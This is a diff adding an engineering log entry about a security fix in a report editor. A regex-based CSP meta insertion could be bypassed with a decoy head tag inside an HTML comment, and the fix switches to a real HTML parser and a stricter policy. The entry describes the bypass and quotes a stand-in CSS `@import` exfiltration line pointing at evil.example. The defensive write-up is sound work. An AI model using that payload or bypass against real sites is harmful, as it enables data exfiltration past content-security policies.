@@ -2648,3 +2648,53 @@ the wrapping-div change); `auto-wrap.test.ts`'s pinned `.chips` case moved to `i
 inline/block containers. Fully TDD: `inline-content.test.ts` (schema), `iframe-document.test.ts` (pure
 string-building, unit-tested even though the iframe mount itself is manual/e2e territory per the task
 brief). Gates green: biome, typecheck, vitest (1020+ tests), docs:check. Not yet merged.
+
+### 2026-07-08 — Blocker security fix: `buildIframeDocument`'s CSP insertion was regex-foolable
+
+A security review of the fix above (same worktree, `worktree/editor-styling-fix`) found the CSP `<meta>`
+insertion itself exploitable: `buildIframeDocument` located `<head>`/`</head>` in `shell.pre` —
+**fully attacker-controlled** HTML (`splitShell` only requires a later `<body …>` tag to exist) — with
+`HEAD_OPEN_RE = /<head[^>]*>/i` + `shell.pre.lastIndexOf("</head>")`. A shell carrying a decoy
+head-shaped string inside an HTML comment (`<!-- decoy <head foo> -->`) fools the regex into matching the
+decoy as "the" head-open tag; the CSP meta gets spliced into that dead comment text (inert, never parsed),
+while `lastIndexOf("</head>")` still finds the real `</head>` — so the real head, carrying the attacker's
+`@import url(https://evil.example/exfil.css)` exfil style, ships with **no CSP at all**. Since the shell's
+`<style>` is opaque to `sanitizeStyle` (never schema-governed, ADR-0062 §9), the CSP meta was the *only*
+mitigation for that block — and it was defeated.
+
+Fixed (TDD — adversarial test written first, confirmed failing against the regex code, then green after
+the fix) by replacing the regex/`indexOf` scan with a real, **comment-aware HTML parser**:
+`buildIframeDocument` now parses `shell.pre + shell.post` in full, inserts the CSP `<meta>` as the parsed
+`<head>`'s first ELEMENT child (highlight/safety-net `<style>` as its last child), and rebuilds the output
+from that `<head>`'s and `<body>`'s own serialized `outerHTML` — never trusting the parser's internal tree
+shape (a genuinely headless input can produce a quirky implied-tag placement in some parsers; detected via
+`documentElement.tagName !== "HTML"` and routed to the pre-existing synthetic-wrapper fallback, which stays
+regex-free and safe regardless since there's no real head to protect in that case).
+
+**Parser choice, and why:** `buildIframeDocument(shell, parseHtml = domParserParse)` takes an injectable
+parser. Production (`ReportEditor.tsx`, browser-only — this function is called from a `useMemo` in a
+mounted React component) uses the default: the browser's own native `DOMParser` — comment-aware, zero
+added client bytes, and (being a lazy default parameter) never referenced under Node. The unit suite
+(`iframe-document.test.ts`) injects `linkedom`'s `parseHTML` instead — already a workspace dependency
+(`arp-report-html`'s server-side DOM backend, `dom-environment.ts`) and, like `DOMParser`, a real
+comment-aware HTML5 parser — so the adversarial tests run under this repo's only unit-test environment
+(vitest's plain `node`, per root `vitest.config.ts`; jsdom was removed as un-shippable, happy-dom was never
+installed) without adding a new DOM-environment devDependency or a heavier parser to the client bundle.
+This mirrors the dependency-injection pattern `dom-environment.ts` already uses (`typeof document !==
+"undefined" ? document : parseHTML(...)`), just inverted (browser-native default, test-injected fallback).
+
+**Secondary hardening in the same fix:** dropped `'self'` from `style-src`/`img-src` — reports are
+self-contained (verified: zero `url(...)`/`@import` occurrences of any kind in the
+`ai-readiness-report.html` fixture), so `'self'` only ever bought a same-origin, cookie-bearing
+request-forgery surface against the app.<domain> origin, never a legitimate report asset. New CSP:
+`default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'`.
+`'unsafe-inline'`/`data:` stay (needed for the report's own inline `<style>` and any inlined images/fonts).
+
+Scope note: this re-parse is the **editor's render surface only**. The saved artifact still round-trips
+through `reinjectShell`'s byte-exact string concatenation (`packages/report-html/src/shell.ts`), which this
+fix does not touch.
+
+`docs/adr/0062-editing-model-report-html-schema.md` §9 gained "Amendment 2" documenting the parser fix and
+the CSP tightening. Gates green: `pnpm install`, `biome ci .` (clean save one pre-existing, unrelated
+fixture CSS-specificity warning), `turbo typecheck`, `vitest run` (1023 tests, 135 files), `docs:check`.
+Not yet merged.
